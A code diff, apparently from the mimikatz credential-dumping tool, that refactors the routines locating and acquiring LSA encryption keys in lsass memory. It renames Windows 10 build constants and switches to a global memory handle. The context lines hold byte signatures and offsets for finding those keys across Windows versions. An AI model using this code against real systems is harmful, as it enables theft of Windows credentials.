@@ -13,7 +13,7 @@ KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // Init
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_LsaInitializeProtectedMemory_KEY[]	= {0x6a, 0x02, 0x6a, 0x10, 0x68};
@@ -21,7 +21,7 @@ KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // Init
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -76, -21}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -69, -18}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
 };
 
 #endif
@@ -158,8 +158,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BO
 NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
 #ifdef _M_X64
 	LONG offset64;
@@ -201,8 +200,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey)
 {
 	BOOL status = FALSE;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
 	PVOID buffer; SIZE_T taille; LONG offset;
 
